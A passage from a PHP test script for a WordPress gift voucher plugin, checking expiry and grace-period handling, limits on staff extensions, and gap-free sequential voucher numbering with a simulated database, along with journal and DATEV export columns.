	$bucket = ( new VCAP\Ledger( new VCAP\VoucherRepository() ) )->liability( wp_date( 'Y-m-d' ) )['totals']['EUR']['giftcard'] ?? array();
	return array( $bucket['amount'] ?? 0.0, $bucket['expired_amount'] ?? 0.0 );
};
$x6_o = array( $x6_open( 'expires' ), $x6_open( 'grace' ), $x6_open( 'never' ) );
check(
	'SET-VC-06: report "open voucher value" (Ledger::liability) – expires: 10 open / 70 expired; grace 30 days: 60 open / 20 expired; never: 80 open / 0 expired; Reports::overview shifts its "expired" figure the same way',
	array( array( 10.0, 70.0 ), array( 60.0, 20.0 ), array( 80.0, 0.0 ) ) == $x6_o
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'src/Reports.php' ), 'ExpiryPolicy::sql_cutoff( $start ), ExpiryPolicy::sql_cutoff( $end )' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Ledger.php' ), "'expired'     => \$v->expires_at && \$v->expires_at <= \$cutoff" ),
	json_encode( $x6_o )
);
$GLOBALS['wpdb']                 = $x6_saved_wpdb;
$GLOBALS['vcap_test_transients'] = array();

// Redemption in the grace period: WooCommerce's own expiry check of a voucher coupon (cart, Store API, admin orders),
// the cart/API checks (Voucher::is_expired()) and the counter's check-in query.
if ( ! class_exists( 'WC_Coupon' ) ) {
	eval( 'class WC_Coupon { public array $meta = array(); public ?DateTime $expires = null; public function get_meta( $key ) { return $this->meta[ $key ] ?? ""; } public function get_date_expires() { return $this->expires; } }' ); // phpcs:ignore Squiz.PHP.Eval -- test stub only when WooCommerce is missing.
}
$x6_c                        = new WC_Coupon();
$x6_c->meta['_vcap_voucher'] = 'yes';
$x6_c->expires               = new DateTime( '@' . ( time() - 5 * DAY_IN_SECONDS ) );
$x6_other                    = new WC_Coupon();
$x6_other->expires           = new DateTime( '@' . ( time() - 5 * DAY_IN_SECONDS ) );
$x6_set( array( 'vcap_expiry_behaviour' => 'expires' ) );
$x6_cv = array( VCAP\ExpiryPolicy::coupon_expired( true, $x6_c ) );
$x6_set( array( 'vcap_expiry_behaviour' => 'grace' ) );
$x6_cv[] = VCAP\ExpiryPolicy::coupon_expired( true, $x6_c );
$x6_cv[] = VCAP\ExpiryPolicy::coupon_expired( true, $x6_other );
$x6_set( array( 'vcap_expiry_grace_days' => '2' ) );
$x6_cv[] = VCAP\ExpiryPolicy::coupon_expired( true, $x6_c );
$x6_set( array( 'vcap_expiry_behaviour' => 'never', 'vcap_expiry_grace_days' => null ) );
$x6_cv[]    = VCAP\ExpiryPolicy::coupon_expired( true, $x6_c );
$x6_cv[]    = VCAP\ExpiryPolicy::coupon_expired( false, $x6_c );
$x6_tickets = (string) file_get_contents( VCAP_PATH . 'src/Tickets.php' );
check(
	'SET-VC-06: redemption in the grace period – WooCommerce\'s expiry check of a voucher coupon follows the behaviour (expires: expired; grace 30: accepted; grace 2: expired; never: accepted), other coupons untouched; cart (CartCoupons), redemption API (RedemptionService) and check-in use Voucher::is_expired() / ExpiryPolicy::sql_cutoff()',
	array( true, false, true, true, false, false ) === $x6_cv
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'src/Coupons/CartCoupons.php' ), 'Voucher::STATUS_EXPIRED === $voucher->status || $voucher->is_expired()' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/API/V1/RedemptionService.php' ), 'Voucher::STATUS_EXPIRED === $voucher->status || $voucher->is_expired()' )
		&& str_contains( $x6_tickets, 'ExpiryPolicy::sql_cutoff( $now )' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/TaxAccounting.php' ), 'ExpiryPolicy::register();' ),
	json_encode( $x6_cv )
);

// Staff extension limit.
$x6_set( array( 'vcap_expiry_behaviour' => null ) );
$x6_ve             = new Voucher();
$x6_ve->expires_at = gmdate( 'Y-m-d H:i:s', time() + 10 * DAY_IN_SECONDS );
$x6_never_v        = new Voucher();
$x6_in             = static fn( int $days ): string => gmdate( 'Y-m-d H:i:s', time() + $days * DAY_IN_SECONDS );
$x6_s0             = array( VCAP\ExpiryPolicy::staff_may_set( $x6_ve, $x6_in( 5000 ) ), VCAP\ExpiryPolicy::staff_may_set( $x6_ve, null ), null === VCAP\ExpiryPolicy::staff_extension_limit( $x6_ve ) );
$x6_set( array( 'vcap_expiry_staff_extension_days' => '30' ) );
$x6_s30 = array(
	VCAP\ExpiryPolicy::staff_may_set( $x6_ve, $x6_in( 39 ) ),        // 10 + 29 days: allowed.
	VCAP\ExpiryPolicy::staff_may_set( $x6_ve, $x6_in( 45 ) ),        // 10 + 35 days: too far.
	VCAP\ExpiryPolicy::staff_may_set( $x6_ve, $x6_in( 2 ) ),         // Shortened: allowed.
	VCAP\ExpiryPolicy::staff_may_set( $x6_ve, null ),                // "Never expires": unlimited extension.
	VCAP\ExpiryPolicy::staff_may_set( $x6_v40, $x6_in( 29 ) ),       // Expired 40 days ago: counted from today.
	VCAP\ExpiryPolicy::staff_may_set( $x6_never_v, $x6_in( 9000 ) ), // Gets a date: shorter than "never".
);
add_filter( 'vcap_expiry_staff_extension_days', static fn() => 0 );
$x6_sf = VCAP\ExpiryPolicy::staff_may_set( $x6_ve, $x6_in( 45 ) );
unset( $GLOBALS['vcap_test_filters']['vcap_expiry_staff_extension_days'] );
$x6_admin = (string) file_get_contents( VCAP_PATH . 'src/Admin/VoucherAdmin.php' );
check(
	'SET-VC-06: staff extension – 0 = no limit (as before); 30 days: up to 30 days after the current expiry or today, shortening always allowed, removing the date refused; filter wins; voucher edit and bulk "Extend validity" check it',
	array( true, true, true ) === $x6_s0 && array( true, false, true, false, true, true ) === $x6_s30 && $x6_sf
		&& str_contains( $x6_admin, '$new_expires !== $v->expires_at && ! \\VCAP\\ExpiryPolicy::staff_may_set( $v, $new_expires )' ) && str_contains( $x6_admin, '! \\VCAP\\ExpiryPolicy::staff_may_set( $v, $new )' ),
	json_encode( array( $x6_s0, $x6_s30, $x6_sf ) )
);
check(
	'SET-VC-06: maintenance step, TAX.md and hooks – expiry step documented in Delivery, TAX.md marks the behaviour "zu prüfen", hooks documented',
	str_contains( (string) file_get_contents( VCAP_PATH . 'src/Delivery.php' ), 'SET-VC-06: the expiry behaviour decides' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'TAX.md' ), 'SET-VC-06' )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'docs/HOOKS.md' ), '| `vcap_expiry_behaviour` | 1.3.0 |' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'docs/HOOKS.md' ), '| `vcap_expiry_staff_extension_days` | 1.3.0 |' )
);
$GLOBALS['vcap_test_options'] = $x6_opts;
$GLOBALS['vcap_test_filters'] = $x6_filters;
VCAP\SettingsRegistry::reset();

echo "Sequential voucher number (SET-VC-13)\n";
/** Database of the voucher number tests: one counter store shared by "connections" (each with its own LAST_INSERT_ID). */
final class VCAP_VN13_Wpdb {
	public static array $counters = array();
	public string $prefix      = 'wp_';
	public string $options     = 'wp_options';
	public string $last_error  = '';
	public array $log          = array();
	public array $numbers      = array();
	public int $last_id        = 0;
	public bool $refuse_number = false;
	/** @var callable|null Runs right after this connection incremented a counter (another request "in between"). */
	public $after_increment = null;
	private ?array $snapshot = null;
	public function prepare( $query, ...$args ) {
		$args = isset( $args[0] ) && is_array( $args[0] ) ? $args[0] : $args;
		return vsprintf( str_replace( array( '%d', '%s', '%i' ), array( '%d', "'%s'", '%s' ), $query ), $args );
	}
	public function suppress_errors( $s = true ) { return false; }
	public function query( $q ) {
		$this->log[] = $q;
		if ( 'START TRANSACTION' === $q ) {
			$this->snapshot = self::$counters;
			return 1;
		}
		if ( 'ROLLBACK' === $q ) {
			self::$counters = $this->snapshot ?? self::$counters;
			$this->snapshot = null;
			return 1;
		}
		if ( 'COMMIT' === $q ) {
			$this->snapshot = null;
			return 1;
		}
		if ( preg_match( "/^INSERT IGNORE INTO wp_options \(option_name, option_value, autoload\) VALUES \('([a-z0-9_]+)', '0', 'off'\)$/", $q, $m ) ) {
			if ( isset( self::$counters[ $m[1] ] ) ) {
				return 0;
			}
			self::$counters[ $m[1] ] = 0;
			return 1;
		}
		if ( preg_match( "/^UPDATE wp_options SET option_value = LAST_INSERT_ID\(CAST\(option_value AS UNSIGNED\) \+ 1\) WHERE option_name = '([a-z0-9_]+)'$/", $q, $m ) ) {
			if ( ! isset( self::$counters[ $m[1] ] ) ) {
				return 0;
			}
			$this->last_id = ++self::$counters[ $m[1] ];
			if ( $this->after_increment ) {
				( $this->after_increment )();
			}
			return 1;
		}
		if ( preg_match( "/^UPDATE wp_vcap_vouchers SET voucher_number = '([^']*)' WHERE id = (\d+) AND voucher_number = ''$/", $q, $m ) ) {
			if ( $this->refuse_number || '' !== ( $this->numbers[ (int) $m[2] ] ?? '' ) ) {
				return 0;
			}
			$this->numbers[ (int) $m[2] ] = $m[1];
			return 1;
		}
		return 1;
	}
	public function get_var( $q ) {
		$this->log[] = $q;
		if ( 'SELECT LAST_INSERT_ID()' === $q ) {
			return (string) $this->last_id;
		}
		if ( str_starts_with( $q, 'SHOW COLUMNS FROM wp_vcap_vouchers' ) ) {
			return 'voucher_number';
		}
		if ( preg_match( "/^SELECT option_value FROM wp_options WHERE option_name = '([a-z0-9_]+)'$/", $q, $m ) ) {
			return isset( self::$counters[ $m[1] ] ) ? (string) self::$counters[ $m[1] ] : null;
		}
		return null;
	}
	public function get_row( $q, $o = null ) { return null; }
	public function get_results( $q, $o = null ) { return array(); }
	public function get_col( $q, $i = 0 ) { return array(); }
}
$vn_saved_opts    = $GLOBALS['vcap_test_options'];
$vn_saved_filters = $GLOBALS['vcap_test_filters'] ?? array();
$vn_saved_wpdb    = $GLOBALS['wpdb'] ?? null;
$GLOBALS['vcap_test_options'] = array();
VCAP\SettingsRegistry::reset();
$vn_reg = array();
foreach ( array( 'vcap_voucher_number_enabled', 'vcap_voucher_number_pattern', 'vcap_voucher_number_prefix', 'vcap_voucher_number_digits', 'vcap_voucher_number_reset' ) as $vn_key ) {
	$vn_e              = VCAP\SettingsRegistry::get( $vn_key );
	$vn_reg[ $vn_key ] = array( $vn_e['type'], $vn_e['default'], $vn_e['section'], $vn_e['min'], $vn_e['max'], $vn_e['legal'] );
}
$vn_fields = VCAP\Settings::general_part( ( new ReflectionMethod( VCAP\Settings::class, 'general_fields' ) )->invoke( new VCAP\Settings() ), 'codes' );
$vn_ids    = array_values( array_filter( array_map( static fn( $f ) => (string) ( $f['id'] ?? '' ), $vn_fields ), static fn( $id ) => str_starts_with( $id, 'vcap_voucher_number' ) ) );
check(
	'SET-VC-13: register – voucher numbers off by default (E9 a), pattern {year}-{number}, no prefix, 5 digits [1–12], yearly restart; block "Voucher numbers" on "Codes"; the counters are internal state (never exported or reset)',
	array(
		'vcap_voucher_number_enabled' => array( 'bool', 'no', 'codes', null, null, true ),
		'vcap_voucher_number_pattern' => array( 'string', '{year}-{number}', 'codes', null, null, false ),
		'vcap_voucher_number_prefix'  => array( 'string', '', 'codes', null, null, false ),
		'vcap_voucher_number_digits'  => array( 'int', 5, 'codes', 1, 12, false ),
		'vcap_voucher_number_reset'   => array( 'select', 'yearly', 'codes', null, null, false ),
	) === $vn_reg
		&& array( 'vcap_voucher_numbers', 'vcap_voucher_number_enabled', 'vcap_voucher_number_pattern', 'vcap_voucher_number_prefix', 'vcap_voucher_number_digits', 'vcap_voucher_number_reset', 'vcap_voucher_numbers' ) === $vn_ids
		&& VCAP\SettingsRegistry::is_internal( 'vcap_voucher_number_seq' ) && VCAP\SettingsRegistry::is_internal( 'vcap_voucher_number_seq_2026' )
		&& ! VCAP\VoucherNumber::enabled(),
	wp_json_encode( array( $vn_reg, $vn_ids ) )
);
$vn_cfg = array( 'pattern' => '{year}-{number}', 'prefix' => '', 'digits' => 5, 'reset' => 'yearly' );
check(
	'SET-VC-13: format – {year}, {number} with leading zeros, prefix in front or at {prefix}; a yearly restart puts the year in front of a pattern without {year}; "never" does not; an invalid pattern falls back to the default',
	'2026-00042' === VCAP\VoucherNumber::format( 42, 2026, $vn_cfg )
		&& 'GS-2026-00042' === VCAP\VoucherNumber::format( 42, 2026, array( 'prefix' => 'GS-' ) + $vn_cfg )
		&& '2026/GS/007' === VCAP\VoucherNumber::format( 7, 2026, array( 'pattern' => '{year}/{prefix}/{number}', 'prefix' => 'GS', 'digits' => 3 ) + $vn_cfg )
		&& '2027-000123' === VCAP\VoucherNumber::format( 123, 2027, array( 'pattern' => '{number}', 'digits' => 6 ) + $vn_cfg )
		&& 'N-123' === VCAP\VoucherNumber::format( 123, 2027, array( 'pattern' => 'N-{number}', 'digits' => 1, 'reset' => 'never' ) + $vn_cfg )
		&& '1234567' === VCAP\VoucherNumber::format( 1234567, 2026, array( 'pattern' => '{number}', 'digits' => 3, 'reset' => 'never' ) + $vn_cfg )
		&& '2026-00001' === VCAP\VoucherNumber::format( 1, 2026, array( 'pattern' => 'no-number-token' ) + $vn_cfg )
		&& 'vcap_voucher_number_seq_2026' === VCAP\VoucherNumber::sequence_option( 2026, 'yearly' ) && 'vcap_voucher_number_seq' === VCAP\VoucherNumber::sequence_option( 2026, 'never' ),
	VCAP\VoucherNumber::format( 7, 2026, array( 'pattern' => '{year}/{prefix}/{number}', 'prefix' => 'GS', 'digits' => 3 ) + $vn_cfg )
);
$vn_bad_import = array( VCAP\SettingsTransfer::validate( 'vcap_voucher_number_pattern', 'GS-{year}' ), VCAP\SettingsTransfer::validate( 'vcap_voucher_number_prefix', 'B B' ) );
$vn_ok_import  = array( VCAP\SettingsTransfer::validate( 'vcap_voucher_number_pattern', 'GS/{year}/{number}' ), VCAP\SettingsTransfer::validate( 'vcap_voucher_number_prefix', 'A#1' ) );
$GLOBALS['vcap_test_options']['vcap_voucher_number_pattern'] = 'R-{number}';
$vn_page = array(
	VCAP\VoucherNumber::sanitize_setting( 'X {number}', array( 'id' => 'vcap_voucher_number_pattern' ) ),
	VCAP\VoucherNumber::sanitize_setting( 'K-{year}-{number}', array( 'id' => 'vcap_voucher_number_pattern' ) ),
	VCAP\VoucherNumber::sanitize_setting( 'B&B', array( 'id' => 'vcap_voucher_number_prefix' ) ),
);
check(
	'SET-VC-13: pattern needs {number} and only letters, digits, . _ - / # besides the tokens; an invalid pattern or prefix is not saved on the settings page (stored value kept) and refused by import/WP-CLI',
	VCAP\VoucherNumber::valid_pattern( '{year}-{number}' ) && ! VCAP\VoucherNumber::valid_pattern( '{year}' ) && ! VCAP\VoucherNumber::valid_pattern( 'A B{number}' ) && ! VCAP\VoucherNumber::valid_pattern( '{number}' . str_repeat( 'x', 40 ) )
		&& VCAP\VoucherNumber::valid_prefix( '' ) && VCAP\VoucherNumber::valid_prefix( 'GS-' ) && ! VCAP\VoucherNumber::valid_prefix( 'Ä' )
		&& array( 'R-{number}', 'K-{year}-{number}', '' ) === $vn_page
		&& is_wp_error( $vn_bad_import[0] ) && is_wp_error( $vn_bad_import[1] ) && array( 'GS/{year}/{number}', 'A#1' ) === $vn_ok_import,
	wp_json_encode( array( $vn_page, $vn_bad_import, $vn_ok_import ) )
);
$vn_v                 = new Voucher();
$vn_v->voucher_number = 'GS-2026-00001';
$vn_row               = $vn_v->to_row();
$vn_back              = Voucher::from_row( array( 'id' => 3, 'voucher_number' => '2026-00007' ) );
$vn_install           = (string) file_get_contents( VCAP_PATH . 'src/Install.php' );
$vn_issuer            = (string) file_get_contents( VCAP_PATH . 'src/Issuer.php' );
check(
	'SET-VC-13: storage – column voucher_number (varchar 64, indexed) of schema 1.9.0; Voucher::to_row() never writes it (a save cannot clear a number, works before the column exists), from_row() reads it; Issuer gives the number in create_voucher() after the coupon and in issue_standalone() (imports, admin issues)',
	! array_key_exists( 'voucher_number', $vn_row ) && '2026-00007' === $vn_back->voucher_number
		&& '1.9.0' === VCAP\Install::VOUCHER_NUMBER_VERSION && str_contains( $vn_install, "voucher_number varchar(64) NOT NULL DEFAULT ''" ) && str_contains( $vn_install, 'KEY voucher_number (voucher_number)' )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' ), "define( 'VCAP_DB_VERSION', '1.9.0' )" )
		&& 2 === substr_count( $vn_issuer, 'VoucherNumber::assign( $voucher );' )
		&& strpos( $vn_issuer, 'VoucherNumber::assign( $voucher );' ) > strpos( $vn_issuer, '$this->coupons->set_coupon_enabled( $voucher, false );' )
		&& strpos( (string) file_get_contents( VCAP_PATH . 'src/Admin/CardImport.php' ), 'issue_standalone( $args )' ) > 0
);

// Assignment with the counter database.
VCAP_VN13_Wpdb::$counters = array();
$vn_db                    = new VCAP_VN13_Wpdb();
$GLOBALS['wpdb']          = $vn_db;
VCAP\Db::reset();
$GLOBALS['vcap_test_options'] = array( 'vcap_db_version' => '1.9.0', 'vcap_voucher_number_enabled' => 'yes', 'vcap_voucher_number_prefix' => 'GS-' );
VCAP\SettingsRegistry::reset();
$vn_make   = static function ( int $id, string $created = '2026-11-24 10:00:00', string $type = 'voucher' ): Voucher {
	$v             = new Voucher();
	$v->id         = $id;
	$v->type       = $type;
	$v->created_at = $created;
	return $v;
};
$vn_a      = $vn_make( 11 );
$vn_b      = $vn_make( 12 );
$vn_c      = $vn_make( 13 );
$vn_out    = array( VCAP\VoucherNumber::assign( $vn_a ), VCAP\VoucherNumber::assign( $vn_b ), VCAP\VoucherNumber::assign( $vn_c ), VCAP\VoucherNumber::assign( $vn_b ) );
$vn_incr   = preg_grep( '/^UPDATE wp_options SET option_value = LAST_INSERT_ID/', $vn_db->log );
$vn_reads  = preg_grep( '/^SELECT option_value FROM wp_options/', $vn_db->log );
$vn_credit = VCAP\VoucherNumber::assign( $vn_make( 14, '2026-11-24 10:00:00', 'credit' ) );
check(
	'SET-VC-13: numbers are given in order without gaps (GS-2026-00001, -00002, -00003), stored on the voucher with one UPDATE … WHERE voucher_number = \'\'; a voucher keeps its number (no second one); store credit accounts get none; the counter is incremented in one statement (LAST_INSERT_ID, no read-then-write) inside a transaction',
	array( 'GS-2026-00001', 'GS-2026-00002', 'GS-2026-00003', 'GS-2026-00002' ) === $vn_out && 'GS-2026-00002' === $vn_b->voucher_number
		&& array( 11 => 'GS-2026-00001', 12 => 'GS-2026-00002', 13 => 'GS-2026-00003' ) === $vn_db->numbers && '' === $vn_credit
		&& 3 === count( $vn_incr ) && array() === $vn_reads && 3 === count( array_keys( $vn_db->log, 'START TRANSACTION', true ) ) && 3 === count( array_keys( $vn_db->log, 'COMMIT', true ) )
		&& 3 === VCAP_VN13_Wpdb::$counters['vcap_voucher_number_seq_2026'],
	wp_json_encode( array( $vn_out, $vn_db->numbers ) )
);
// Two requests at the same moment: another connection increments right after this one, before it reads its value.
$vn_other                   = new VCAP_VN13_Wpdb();
$vn_other_got               = array();
$GLOBALS['vcap_vn13_first'] = $vn_db;
$vn_db->after_increment     = static function () use ( $vn_other, &$vn_other_got ) {
	$vn_other->after_increment = null;
	$GLOBALS['wpdb']           = $vn_other;
	$v                         = new Voucher();
	$v->id                     = 21;
	$v->created_at             = '2026-11-24 10:00:01';
	$vn_other_got[]            = VCAP\VoucherNumber::assign( $v );
	$GLOBALS['wpdb']           = $GLOBALS['vcap_vn13_first'];
};
$vn_mine                = VCAP\VoucherNumber::assign( $vn_make( 20 ) );
$vn_db->after_increment = null;
check(
	'SET-VC-13: concurrent orders never get the same number – a second request that increments between this request\'s increment and its read gets the next value (LAST_INSERT_ID is per connection), both numbers differ',
	'GS-2026-00004' === $vn_mine && array( 'GS-2026-00005' ) === $vn_other_got && 5 === VCAP_VN13_Wpdb::$counters['vcap_voucher_number_seq_2026'],
	wp_json_encode( array( $vn_mine, $vn_other_got ) )
);
VCAP\Db::reset();
$vn_db->refuse_number = true;
$vn_failed            = VCAP\VoucherNumber::assign( $vn_make( 30 ) );
$vn_db->refuse_number = false;
$vn_after             = VCAP\VoucherNumber::assign( $vn_make( 31 ) );
check(
	'SET-VC-13: when the number cannot be written onto the voucher the counter increment is rolled back (no gap): the next voucher gets the number that was not used',
	'' === $vn_failed && 'GS-2026-00006' === $vn_after && in_array( 'ROLLBACK', $vn_db->log, true ),
	wp_json_encode( array( $vn_failed, $vn_after ) )
);
$GLOBALS['vcap_test_options']['vcap_voucher_number_reset'] = 'never';
$vn_never = array( VCAP\VoucherNumber::assign( $vn_make( 40, '2026-12-31 10:00:00' ) ), VCAP\VoucherNumber::assign( $vn_make( 41, '2027-01-02 10:00:00' ) ) );
$vn_never_preview = VCAP\VoucherNumber::preview();
$GLOBALS['vcap_test_options']['vcap_voucher_number_reset'] = 'yearly';
$vn_new_year = VCAP\VoucherNumber::assign( $vn_make( 42, '2027-01-02 10:00:00' ) );
check(
	'SET-VC-13: restart – "never" counts on across the new year with its own counter, "yearly" starts again at 1 in 2027; the settings preview shows the next number',
	array( 'GS-2026-00001', 'GS-2027-00002' ) === $vn_never && 'GS-2027-00001' === $vn_new_year && 1 === VCAP_VN13_Wpdb::$counters['vcap_voucher_number_seq_2027'] && 2 === VCAP_VN13_Wpdb::$counters['vcap_voucher_number_seq']
		&& str_starts_with( $vn_never_preview, 'GS-' ) && str_ends_with( $vn_never_preview, '-00003' ),
	wp_json_encode( array( $vn_never, $vn_new_year, $vn_never_preview ) )
);
add_filter( 'vcap_voucher_number_enabled', static fn() => false );
$vn_filtered_off = VCAP\VoucherNumber::assign( $vn_make( 50 ) );
$GLOBALS['vcap_test_filters']['vcap_voucher_number_enabled'] = array();
$GLOBALS['vcap_test_options']['vcap_voucher_number_enabled'] = 'no';
add_filter( 'vcap_voucher_number_enabled', static fn() => true );
add_filter( 'vcap_voucher_number', static fn( $n, $seq, $year ) => 'X' . $year . '.' . $seq, 10, 3 );
$vn_filtered_on = VCAP\VoucherNumber::assign( $vn_make( 51 ) );
$GLOBALS['vcap_test_filters']['vcap_voucher_number_enabled'] = array();
$GLOBALS['vcap_test_filters']['vcap_voucher_number']         = array();
$vn_off = VCAP\VoucherNumber::assign( $vn_make( 52 ) );
$GLOBALS['vcap_test_options']['vcap_voucher_number_enabled'] = 'yes';
$GLOBALS['vcap_test_options']['vcap_db_version']             = '1.8.0';
$vn_old_schema = VCAP\VoucherNumber::assign( $vn_make( 53 ) );
check(
	'SET-VC-13: the filter vcap_voucher_number_enabled wins in both directions, vcap_voucher_number changes the number; switched off (default) nothing is given; before schema 1.9.0 nothing is given',
	'' === $vn_filtered_off && 'X2026.7' === $vn_filtered_on && '' === $vn_off && '' === $vn_old_schema,
	wp_json_encode( array( $vn_filtered_off, $vn_filtered_on, $vn_off, $vn_old_schema ) )
);
$GLOBALS['wpdb'] = $vn_saved_wpdb;
VCAP\Db::reset();

// Placeholder, voucher list, journal and DATEV.
$GLOBALS['vcap_test_options'] = array( 'vcap_datev_liability_account' => '3272', 'vcap_datev_clearing_account' => '1360', 'vcap_datev_income_account' => '2700', 'vcap_datev_consultant' => '12345', 'vcap_datev_client' => '99' );
$vn_jrow      = array( 'created_at' => '2026-11-14 10:00:00', 'code' => 'ABC', 'type' => 'giftcard', 'currency' => 'EUR', 'event' => 'redeemed', 'amount' => 5, 'balance_after' => 10, 'order_id' => 0, 'till' => '', 'receipt' => '', 'note' => '', 'voucher_id' => 0, 'voucher_number' => 'GS-2026-00042' );
$vn_off_head  = VCAP\Ledger::journal_header();
$vn_off_line  = VCAP\Ledger::journal_line( $vn_jrow );
$vn_off_datev = VCAP\DatevExport::booking( $vn_jrow, VCAP\DatevExport::config() );
$GLOBALS['vcap_test_options']['vcap_voucher_number_enabled'] = 'yes';
$vn_on_csv   = VCAP\Ledger::journal_csv( array( $vn_jrow ) );
$vn_on_datev = VCAP\DatevExport::booking( $vn_jrow, VCAP\DatevExport::config() );
$vn_long     = VCAP\DatevExport::booking( array( 'voucher_number' => 'GUTSCHEIN-2026/000042' ) + $vn_jrow, VCAP\DatevExport::config() );
check(
	'SET-VC-13: journal and DATEV are unchanged while the numbers are off (14 columns, "Belegfeld 2" empty); switched on the journal has "Voucher no." after "Code" and DATEV "Belegfeld 2" the number (DATEV length 12, cut)',
	14 === count( $vn_off_head ) && 14 === count( $vn_off_line ) && ! in_array( 'Voucher no.', $vn_off_head, true ) && null !== $vn_off_datev && '' === $vn_off_datev[11]
		&& 15 === count( $vn_on_csv[0] ) && 'Voucher no.' === $vn_on_csv[0][2] && 'GS-2026-00042' === $vn_on_csv[1][2]
		&& null !== $vn_on_datev && 'GS-2026-0004' === $vn_on_datev[11] && 'ABC' === $vn_on_datev[10] && 'GUTSCHEIN-20' === $vn_long[11] && 14 === count( $vn_on_datev ),
	wp_json_encode( array( $vn_on_csv, $vn_on_datev ) )
);
$vn_pv                 = new Voucher();
$vn_pv->code           = 'CODE-1';
$vn_pv->voucher_number = 'GS-2026-00042';
$vn_pv->currency       = 'EUR';
$vn_pv->created_at     = '2026-11-24 10:00:00';
$vn_values             = Placeholders::values( $vn_pv );
if ( ! class_exists( 'WP_List_Table' ) ) {
	/** Minimal stand-in for the column list of VouchersListTable (no WordPress admin loaded). */
	class WP_List_Table {
		public function __construct( $args = array() ) {}
	}
}
$vn_list               = new VCAP\Admin\VouchersListTable( new VCAP\VoucherRepository() );
$vn_cols_on            = $vn_list->get_columns();
$GLOBALS['vcap_test_options']['vcap_voucher_number_enabled'] = 'no';
$vn_cols_off = $vn_list->get_columns();
check(
	'SET-VC-13: placeholder {voucher_number} (offered in the PDF designer and emails) prints the number; the voucher list has the column "Voucher no." after "Code" only while the numbers are on',
	isset( Placeholders::definitions()['voucher_number'] ) && 'GS-2026-00042' === $vn_values['voucher_number']
		&& array( 'cb', 'code', 'number', 'product' ) === array_slice( array_keys( $vn_cols_on ), 0, 4 ) && ! isset( $vn_cols_off['number'] ),
	wp_json_encode( array( array_keys( $vn_cols_on ), $vn_values['voucher_number'] ?? null ) )
);
$GLOBALS['vcap_test_filters'] = $vn_saved_filters;
$GLOBALS['vcap_test_options'] = $vn_saved_opts;
VCAP\SettingsRegistry::reset();


echo "\n$passed passed, $failed failed. Output: $out\n";
exit( $failed ? 1 : 0 );
